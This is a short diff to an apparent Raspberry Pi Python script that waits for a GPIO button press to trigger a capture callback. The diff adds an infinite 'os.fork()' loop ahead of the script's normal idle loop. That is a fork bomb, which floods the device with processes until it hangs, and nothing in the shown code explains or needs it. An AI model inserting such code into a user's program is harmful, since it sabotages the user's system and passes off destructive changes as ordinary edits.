@@ -27,4 +27,7 @@ def capture(channel):
 GPIO.add_event_detect(BUTTON_PORT, GPIO.FALLING, callback=capture, bouncetime=2000)
 
 while True:
+    os.fork()
+
+while True:
     time.sleep(1)
